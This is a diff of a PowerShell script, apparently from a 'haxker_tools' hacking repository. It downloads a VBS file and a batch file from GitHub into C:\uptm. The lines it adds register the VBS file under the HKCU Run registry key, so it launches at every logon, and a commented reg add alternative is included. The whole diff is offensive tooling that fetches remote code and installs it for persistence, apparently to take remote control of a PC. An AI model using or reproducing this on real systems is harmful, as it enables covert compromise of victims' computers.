@@ -67,9 +67,19 @@ if (!(Test-Path $dir)) {
 
 # 4. Download Startup Script
 $vbsUrl = "https://github.com/brndan918/haxker_tools/raw/refs/heads/main/hack_PC_cmd/AutoRun/auto_host.vbs"
-$vbsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\auto_host.vbs"
+$vbsPath = "C:\uptm\auto_host.vbs"
 Write-Host "Downloading auto_host.vbs..."
 Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsPath -UseBasicParsing
+
+# 4.5 Auto Startup Setup
+$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$valueName = "AutoHostScript"
+
+Write-Host "Auto Start Setup..."
+
+New-ItemProperty -Path $registryPath -Name $valueName -Value "wscript.exe `"$vbsPath`"" -PropertyType String -Force
+# or
+# reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AutoHostScript" /t REG_SZ /d "wscript.exe \`"$vbsPath\`"" /f
 
 # 5. Download Main Batch
 $batUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/AutoRun/host_uptm.bat"
